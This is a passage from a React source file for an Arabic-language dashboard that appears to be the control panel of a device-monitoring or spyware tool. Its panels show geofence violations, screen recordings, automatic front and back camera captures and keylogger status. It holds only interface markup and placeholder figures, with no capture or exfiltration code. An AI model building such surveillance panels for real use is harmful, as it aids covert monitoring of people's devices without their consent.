              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white flex items-center">
                    <MapPin className="h-5 w-5 ml-2 text-red-400" />
                    النظام الجغرافي
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    مراقبة المناطق الجغرافية والانتهاكات
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-red-400">{advancedStats.geoViolations}</div>
                      <div className="text-xs text-gray-400">انتهاكات</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-blue-400">4</div>
                      <div className="text-xs text-gray-400">مناطق</div>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                        <span className="text-sm text-gray-300">المنزل</span>
                      </div>
                      <span className="text-green-400">آمن</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-3 h-3 bg-blue-500 rounded-full"></div>
                        <span className="text-sm text-gray-300">العمل</span>
                      </div>
                      <span className="text-blue-400">آمن</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                        <span className="text-sm text-gray-300">منطقة محظورة</span>
                      </div>
                      <span className="text-red-400">انتهاك</span>
                    </div>
                  </div>
                  
                  <Button className="w-full bg-red-600 hover:bg-red-700">
                    <MapIcon className="h-4 w-4 ml-2" />
                    عرض الخريطة
                  </Button>
                </CardContent>
              </Card>

              {/* Screen Recorder Panel */}
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white flex items-center">
                    <Monitor className="h-5 w-5 ml-2 text-yellow-400" />
                    مسجل الشاشة
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    تسجيل ومراقبة أنشطة الشاشة
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-yellow-400">17</div>
                      <div className="text-xs text-gray-400">تسجيلات</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-blue-400">2</div>
                      <div className="text-xs text-gray-400">أجهزة نشطة</div>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">تسجيلات اليوم</span>
                      <span className="text-green-400">5</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">إجمالي المدة</span>
                      <span className="text-blue-400">1:23:45</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">حجم الملفات</span>
                      <span className="text-yellow-400">2.1 GB</span>
                    </div>
                  </div>
                  
                  <Button className="w-full bg-yellow-600 hover:bg-yellow-700">
                    <Video className="h-4 w-4 ml-2" />
                    عرض التسجيلات
                  </Button>
                </CardContent>
              </Card>

              {/* Camera Capture Panel */}
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white flex items-center">
                    <Camera className="h-5 w-5 ml-2 text-pink-400" />
                    التقاط الكاميرا
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    التقاط الصور التلقائي والمجدول
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-pink-400">{advancedStats.totalPhotos}</div>
                      <div className="text-xs text-gray-400">صور</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-blue-400">3</div>
                      <div className="text-xs text-gray-400">أجهزة نشطة</div>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">صور اليوم</span>
                      <span className="text-green-400">24</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">كاميرا أمامية</span>
                      <span className="text-blue-400">89</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">كاميرا خلفية</span>
                      <span className="text-purple-400">67</span>
                    </div>
                  </div>
                  
                  <Button className="w-full bg-pink-600 hover:bg-pink-700">
                    <Image className="h-4 w-4 ml-2" />
                    عرض الصور
                  </Button>
                </CardContent>
              </Card>
            </div>

            {/* Advanced Statistics Chart */}
            <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-white">إحصائيات الميزات المتقدمة</CardTitle>
                <CardDescription className="text-gray-400">
                  مقارنة أداء الميزات المختلفة
                </CardDescription>
              </CardHeader>
              <CardContent>
                <ResponsiveContainer width="100%" height={300}>
                  <BarChart data={[
                    { name: 'Keylogger', active: 2, total: 3 },
                    { name: 'المكالمات', active: 3, total: 3 },
                    { name: 'الشاشة', active: 2, total: 3 },
                    { name: 'الكاميرا', active: 3, total: 3 },
                    { name: 'اجتماعي', active: 2, total: 3 },
                    { name: 'جغرافي', active: 2, total: 3 }
                  ]}>
                    <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                    <XAxis 
                      dataKey="name" 
                      stroke="#9CA3AF"
                      style={{ fontSize: '12px' }}
                    />
                    <YAxis stroke="#9CA3AF" style={{ fontSize: '12px' }} />
                    <Tooltip 
                      contentStyle={{ 
                        backgroundColor: '#1F2937', 
                        border: '1px solid #374151',
                        borderRadius: '8px',
                        color: '#F9FAFB'
                      }} 
                    />
                    <Bar dataKey="active" fill="#3B82F6" />
                    <Bar dataKey="total" fill="#6B7280" />
                  </BarChart>
                </ResponsiveContainer>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Settings Tab */}
          <TabsContent value="settings" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white">إعدادات عامة</CardTitle>
                  <CardDescription className="text-gray-400">
                    تكوين الإعدادات الأساسية للنظام
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-white">عنوان الخادم</label>
                    <Input 
                      defaultValue="http://localhost:5000"
                      className="bg-slate-700/50 border-slate-600 text-white"
                    />
                  </div>
                  
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-white">فترة التحديث (ثانية)</label>
                    <Input 
                      type="number"
                      defaultValue="30"
                      className="bg-slate-700/50 border-slate-600 text-white"
                    />
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-white">الإشعارات الصوتية</span>
                    <Button variant="outline" size="sm" className="border-slate-600">
                      تفعيل
                    </Button>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-white">الوضع المظلم</span>
                    <Button variant="outline" size="sm" className="border-slate-600">
                      مفعل
                    </Button>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white">إعدادات الأمان</CardTitle>
                  <CardDescription className="text-gray-400">
                    تكوين إعدادات الحماية والأمان
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-white">كلمة مرور المدير</label>
                    <Input 
                      type="password"
                      placeholder="••••••••"
                      className="bg-slate-700/50 border-slate-600 text-white"
                    />
                  </div>
                  
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-white">مدة انتهاء الجلسة (دقيقة)</label>
                    <Input 
                      type="number"
                      defaultValue="60"
                      className="bg-slate-700/50 border-slate-600 text-white"
                    />
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-white">المصادقة الثنائية</span>
                    <Button variant="outline" size="sm" className="border-slate-600">
                      تفعيل
                    </Button>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-white">تشفير البيانات</span>
                    <Button variant="outline" size="sm" className="border-slate-600">
                      مفعل
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  )
}

export default App

